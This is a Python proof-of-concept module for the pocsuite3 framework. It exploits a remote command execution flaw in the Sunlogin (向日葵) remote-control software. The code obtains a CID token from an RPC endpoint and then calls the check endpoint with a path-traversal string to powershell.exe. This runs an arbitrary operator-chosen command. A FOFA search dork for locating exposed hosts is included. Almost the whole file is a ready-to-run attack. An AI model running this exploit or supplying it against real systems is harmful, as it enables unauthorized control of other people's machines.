"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import re, base64, json
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '18'  
    author = ['PeiQi']
    name = '向日葵 check 远程命令执行漏洞'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取
    '''
    appPowerLink = 'https://guanjia.qq.com/'
    appName = '向日葵'
    appVersion = '未知版本'
    fofa_dork = {'fofa': 'body="Verification failure"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString("ipconfig", description='自定义命令执行')
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/cgi-bin/rpc?action=verify-haras"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if 'verify_string' in resp.text and 'enabled' in resp.text and resp.status_code == 200:
                cid = json.loads(resp.text)['verify_string']
                url_2 = self.url.rstrip('/') + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+" + self.get_option("cmd")
                headers_2 = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie":"CID=" + cid,
                }
                resp = requests.get(url_2, headers=headers_2, timeout=8)
                if resp.status_code == 200 and "false" not in resp.text and "Windows" in resp.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['CID'] = cid
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Response'] = resp.text
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url.rstrip('/') + "/cgi-bin/rpc?action=verify-haras"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if 'verify_string' in resp.text and 'enabled' in resp.text and resp.status_code == 200:
                cid = json.loads(resp.text)['verify_string']
                url_2 = self.url.rstrip('/') + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+" + self.get_option("cmd")
                headers_2 = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie":"CID=" + cid,
                }
                resp = requests.get(url_2, headers=headers_2, timeout=10)
                if resp.status_code == 200 and "false" not in resp.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['CID'] = cid
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Response'] = resp.text
        except Exception as ex:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)